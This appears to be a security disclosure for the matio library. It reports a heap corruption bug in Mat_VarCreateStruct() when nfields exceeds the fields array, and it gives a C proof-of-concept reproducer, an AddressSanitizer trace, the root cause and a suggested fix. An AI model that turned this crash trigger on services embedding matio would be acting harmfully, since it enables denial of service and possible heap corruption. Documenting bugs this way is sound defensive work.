A heap-based memory corruption can occur in Mat_VarCreateStruct() when the nfields value does not match the actual number of strings in the fields array. This leads to out-of-bounds reads and invalid memory frees during cleanup, potentially causing a segmentation fault or heap corruption.



**The function prototype is :**

```
Mat_VarCreateStruct(const char *name, int rank, const size_t *dims, const char **fields,
                    unsigned nfields)
```

This API assumes that fields is an array of nfields non-NULL strings. However, no validation is done to ensure that the fields array actually contains nfields valid pointers. If fewer than nfields pointers are provided, uninitialized memory may be accessed and freed later via Mat_VarFree(), resulting in undefined behavior.

Product: matio library Project URL: https://github.com/tbeu/matio

**Affected Versions**: 1.5.28 (development snapshot) master branch at commit de6590eef17a19fc64c362af34294fbc58d2bd07

**Reproducer :**

```
#include <stdlib.h>
#include "matio.h"

int main() {
    int rank = 2;
    size_t dims[2] = {0x100, 0x100};
    unsigned nfields = 0x10;
    const char *fields[1] = {"A"};  // only 1 field, but nfields is 16
    matvar_t *var = Mat_VarCreateStruct("evil", rank, dims, fields, nfields);
    if (!var) {
        printf("Mat_VarCreateStruct failed (maybe patched or OOM)\n");
        return 1;
    }

	Mat_VarFree(var);
	printf("Done\n");
	return 0;
}
```



**With AddressSanitizer :**

```
AddressSanitizer:DEADLYSIGNAL
==2309342==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x00000041f594 bp 0x000000000000 sp 0x7ffd45b66b70 T0)
==2309342==The signal is caused by a READ memory access.
==2309342==Hint: this fault was caused by a dereference of a high value address (see register values below).  Dissassemble the provided pc to learn which register was used.
    #0 0x41f594 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/poc+0x41f594)
    #1 0x496841 in free (/poc+0x496841)
    #2 0x729bc620cdd8 in Mat_VarFree /home/zakka/Desktop/fuzzcampain/matio/src/mat.c:1848
    #3 0x729bc6219c9c in Mat_VarCreateStruct /home/zakka/Desktop/fuzzcampain/matio/src/matvar_struct.c:85
    #4 0x4c62a6 in main /poc.c:11:21
    #5 0x729bc5e29d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58:16
    #6 0x729bc5e29e3f in __libc_start_main ../csu/libc-start.c:392:3
    #7 0x41e2f4 in _start (/poc+0x41e2f4)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/poc+0x41f594) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)
==2309342==ABORTING`
```



**Root Cause :**

in `matvar_struct.c`

```
83                  for ( i = 0; i < nfields; i++ ) {
84                      if ( NULL == fields[i] ) {
85                          Mat_VarFree(matvar);
```

Later in `Mat_VarFree`, the loop attempts to `free(fieldnames[i])` even if it's corrupted.



**Impact:**

- At minimum, this is a denial of service.
- In certain environments, it may lead to heap corruption.
- If `matio` is embedded in services accepting user-supplied `.mat` files or struct construction based on user input, this may be triggered remotely.



**Recommendation:**

Add validation to ensure `fields` is either NULL (with `nfields == 0`) or contains exactly `nfields` non-NULL pointers.




